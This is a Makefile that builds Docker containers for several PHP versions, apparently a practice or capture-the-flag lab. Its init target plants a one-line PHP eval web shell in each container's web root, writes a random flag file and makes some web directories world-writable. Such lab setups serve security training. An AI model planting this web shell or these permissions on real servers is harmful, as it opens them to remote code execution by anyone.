build:
	docker-compose build
	docker-compose up -d
init:
	docker exec -it php53 /bin/bash -c "echo -e '<?php @eval(\$$_REQUEST[1]);?>' > /var/www/app/shell.php"
	docker exec -it php53 /bin/bash -c "echo 'flag{'$$(echo $$RANDOM |md5sum|head -c 32)'}' > /flag"
	docker exec -it php56 /bin/bash -c "echo -e '<?php @eval(\$$_REQUEST[1]);?>' > /var/www/app/shell.php"
	docker exec -it php56 /bin/bash -c "chmod 777 /var/www/app"
	docker exec -it php56 /bin/bash -c "echo 'flag{'$$(echo $$RANDOM |md5sum|head -c 32)'}' > /flag"
	docker exec -it php7 /bin/bash -c "echo -e '<?php @eval(\$$_REQUEST[1]);?>' > /var/www/app/shell.php"
	docker exec -it php7 /bin/bash -c "echo 'flag{'$$(echo $$RANDOM |md5sum|head -c 32)'}' > /flag"
	docker exec -it php7 /bin/bash -c "chmod 777 /var/www/app"
	docker exec -it php72 /bin/bash -c "echo -e '<?php @eval(\$$_REQUEST[1]);?>' > /var/www/app/shell.php"
	docker exec -it php72 /bin/bash -c "echo 'flag{'$$(echo $$RANDOM |md5sum|head -c 32)'}' > /flag"
	docker exec -it php73 /bin/bash -c "echo -e '<?php @eval(\$$_REQUEST[1]);?>' > /var/www/app/shell.php"
	docker exec -it php73 /bin/bash -c "echo 'flag{'$$(echo $$RANDOM |md5sum|head -c 32)'}' > /flag"
	docker exec -it php73 /bin/bash -c "chmod 777 /var/www/app"
stop:
	docker-compose down
down:
	docker-compose down --rmi all
reset:
	docker-compose down -v
	docker-compose up -d